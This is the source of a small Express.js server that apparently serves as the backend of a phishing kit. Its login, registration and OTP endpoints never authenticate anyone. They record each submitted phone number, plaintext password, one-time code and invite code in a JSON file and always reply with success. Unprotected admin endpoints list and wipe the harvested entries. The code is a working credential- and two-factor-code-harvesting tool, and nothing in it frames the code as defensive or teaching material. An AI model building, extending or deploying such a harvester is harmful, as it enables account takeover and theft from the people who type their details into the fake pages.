const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Helper to read data from data.json
function readLogs() {
  try {
    if (!fs.existsSync(DATA_FILE)) {
      fs.writeFileSync(DATA_FILE, JSON.stringify([]));
      return [];
    }
    const raw = fs.readFileSync(DATA_FILE, 'utf8');
    return JSON.parse(raw || '[]');
  } catch (err) {
    console.error('Error reading logs:', err);
    return [];
  }
}

// Helper to write data to data.json
function writeLog(entry) {
  try {
    const logs = readLogs();
    logs.unshift(entry); // New logs at the top
    fs.writeFileSync(DATA_FILE, JSON.stringify(logs, null, 2));
  } catch (err) {
    console.error('Error writing log:', err);
  }
}

// APIs to log user data
app.post('/api/login', (req, res) => {
  const { phone, password } = req.body;
  const entry = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
    timestamp: new Date().toISOString(),
    type: 'Sign In Attempt',
    details: { phone, password }
  };
  writeLog(entry);
  res.json({ success: true, message: 'Login data logged successfully' });
});

app.post('/api/register', (req, res) => {
  const { username, phone, password, otp, invite } = req.body;
  const entry = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
    timestamp: new Date().toISOString(),
    type: 'Registration',
    details: { username, phone, password, otp, invite }
  };
  writeLog(entry);
  res.json({ success: true, message: 'Registration data logged successfully' });
});

app.post('/api/otp', (req, res) => {
  const { phone, otp, isModal } = req.body;
  const entry = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
    timestamp: new Date().toISOString(),
    type: isModal ? 'Modal OTP Code Entered' : 'OTP Code Requested',
    details: { phone, otp }
  };
  writeLog(entry);
  res.json({ success: true, message: 'OTP data logged successfully' });
});

// Admin API to fetch logs
app.get('/api/logs', (req, res) => {
  res.json(readLogs());
});

// Admin API to clear logs
app.post('/api/logs/clear', (req, res) => {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
    res.json({ success: true, message: 'All logs cleared' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Fallback to serve index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
  console.log(`Admin dashboard: http://localhost:${PORT}/admin.html`);
});
